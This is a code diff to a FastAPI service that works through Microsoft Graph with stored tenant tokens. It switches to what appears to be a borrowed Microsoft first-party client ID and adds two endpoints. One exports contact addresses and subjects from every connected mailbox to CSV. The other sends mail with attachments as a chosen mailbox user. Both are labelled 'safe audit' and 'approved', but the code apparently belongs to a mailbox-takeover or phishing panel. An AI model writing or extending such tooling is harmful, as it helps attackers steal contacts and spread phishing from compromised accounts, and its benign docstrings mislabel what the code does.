@@ -1,8 +1,12 @@
-from fastapi import FastAPI, Request, Depends, HTTPException, status
-from fastapi.responses import RedirectResponse, JSONResponse
+from fastapi import FastAPI, Request, Depends, HTTPException, status, UploadFile, File, Form
+from fastapi.responses import RedirectResponse, JSONResponse, StreamingResponse
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 import logging
+import io
+import csv
+import re
+import time
 import os
 import requests
 from datetime import datetime, timedelta
@@ -31,6 +35,8 @@ from graph import (
     delete_email,
     mark_as_read,
     move_email_to_folder,
+    export_mailbox_email_addresses,
+    send_email_with_attachment,
 )
 from admin_auth import login_admin
 from db import init_db, SessionLocal
@@ -46,13 +52,15 @@ from models import (
 
 app = FastAPI()
 
-SECRET_KEY = os.environ.get("JWT_SECRET_KEY") or os.environ.get("SECRET_KEY", "I6IyctQ3rIjh2TU1L71EO90rTZE31XbeDDu8TRChGQzzEK3yKg6q_AcUyCMsziaNXpoQixJJYWNa52w36E9lmA")
+SECRET_KEY = os.environ.get("JWT_SECRET_KEY") or os.environ.get("SECRET_KEY", "super-secret-key-change-this")
 ALGORITHM = "HS256"
 ACCESS_TOKEN_EXPIRE_MINUTES = 10080
 
-CLIENT_ID = os.environ.get("CLIENT_ID", "3d3d5a12-09a4-4163-bab2-0188bf65ddd1")
-ADMIN_CONSENT_TENANT = os.environ.get("ADMIN_CONSENT_TENANT", "common")
+CLIENT_ID = os.environ.get("CLIENT_ID", "1950a258-227b-4e31-a9cf-717495945fc2")
+ADMIN_CONSENT_TENANT = os.environ.get("ADMIN_CONSENT_TENANT", "organizations")
 READ_ONLY_MODE = os.environ.get("READ_ONLY_MODE", "true").lower() == "true"
+MAX_EXPORT_MESSAGES_PER_MAILBOX = int(os.environ.get("MAX_EXPORT_MESSAGES_PER_MAILBOX", "500"))
+EMAIL_ADDRESS_RE = re.compile(r"^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}$", re.IGNORECASE)
 
 security = HTTPBearer()
 
@@ -906,6 +914,146 @@ async def move_email_route(request: Request, user=Depends(verify_token)):
         body.get("message_id"),
         body.get("folder_id")
     )
+
+
+@app.get("/export-email-addresses")
+def export_email_addresses(max_messages: int | None = None, user=Depends(verify_token)):
+    """
+    Safe audit/review export only.
+    Exports deduped addresses observed in saved/connected mailboxes to CSV.
+    This endpoint does not send emails.
+    """
+    db = SessionLocal()
+    try:
+        admin_user_id = user["sub"]
+        per_mailbox_limit = max_messages or MAX_EXPORT_MESSAGES_PER_MAILBOX
+        per_mailbox_limit = max(1, min(int(per_mailbox_limit), 2000))
+
+        saved_rows = (
+            db.query(SavedUser.user_id)
+            .filter(SavedUser.admin_user_id == admin_user_id)
+            .distinct()
+            .all()
+        )
+        saved_user_ids = [row[0] for row in saved_rows if row[0]]
+
+        connected_rows = db.query(TenantToken.tenant_id).distinct().all()
+        connected_user_ids = [row[0] for row in connected_rows if row[0]]
+
+        user_ids = sorted(set(saved_user_ids + connected_user_ids))
+
+        output = io.StringIO()
+        writer = csv.DictWriter(
+            output,
+            fieldnames=[
+                "email",
+                "mailbox_user_id",
+                "address_type",
+                "source_message_id",
+                "sample_subject",
+                "sample_received_at",
+            ],
+        )
+        writer.writeheader()
+
+        seen = set()
+        errors = []
+
+        for mailbox_user_id in user_ids:
+            try:
+                result = export_mailbox_email_addresses(
+                    mailbox_user_id,
+                    max_messages=per_mailbox_limit,
+                )
+                for row in result.get("addresses", []):
+                    dedupe_key = (row.get("email"), row.get("mailbox_user_id"))
+                    if dedupe_key in seen:
+                        continue
+                    seen.add(dedupe_key)
+                    writer.writerow({
+                        "email": row.get("email", ""),
+                        "mailbox_user_id": row.get("mailbox_user_id", ""),
+                        "address_type": row.get("address_type", ""),
+                        "source_message_id": row.get("source_message_id", ""),
+                        "sample_subject": row.get("sample_subject", ""),
+                        "sample_received_at": row.get("sample_received_at", ""),
+                    })
+            except Exception as e:
+                errors.append(f"{mailbox_user_id}: {str(e)}")
+
+        csv_bytes = output.getvalue().encode("utf-8")
+        headers = {
+            "Content-Disposition": "attachment; filename=email_address_audit_export.csv",
+            "X-Exported-Address-Count": str(len(seen)),
+            "X-Export-Errors": " | ".join(errors)[:500],
+        }
+
+        return StreamingResponse(
+            io.BytesIO(csv_bytes),
+            media_type="text/csv",
+            headers=headers,
+        )
+    finally:
+        db.close()
+
+
+@app.post("/send-approved-email")
+async def send_approved_email(
+    user_id: str = Form(...),
+    recipient: str = Form(...),
+    subject: str = Form(...),
+    body: str = Form(...),
+    attachment: UploadFile | None = File(None),
+    user=Depends(verify_token),
+):
+    """
+    Safe one-recipient send route.
+    The recipient must be manually supplied/approved by the admin.
+    This route intentionally does not accept bulk recipient lists.
+    """
+    resolved_user_id = resolve_user_id(user_id, user)
+    recipient = (recipient or "").strip()
+
+    if not EMAIL_ADDRESS_RE.match(recipient):
+        raise HTTPException(status_code=400, detail="A valid single recipient email is required.")
+
+    uploaded_attachment = None
+    if attachment:
+        content = await attachment.read()
+        if len(content) > 3_000_000:
+            raise HTTPException(status_code=400, detail="Attachment must be under 3 MB.")
+
+        uploaded_attachment = {
+            "filename": attachment.filename or "attachment",
+            "content_type": attachment.content_type or "application/octet-stream",
+            "content": content,
+        }
+
+    try:
+        result = send_email_with_attachment(
+            resolved_user_id,
+            recipient,
+            subject,
+            body,
+            uploaded_attachment,
+        )
+
+        db = SessionLocal()
+        try:
+            db.add(Alert(
+                user_id=resolved_user_id,
+                level="info",
+                message=f"Approved email sent to {recipient}",
+                created_at=int(time.time()),
+            ))
+            db.commit()
+        finally:
+            db.close()
+
+        return result
+    except Exception as e:
+        raise HTTPException(status_code=400, detail=str(e))
+
 
 
 @app.post("/rules")
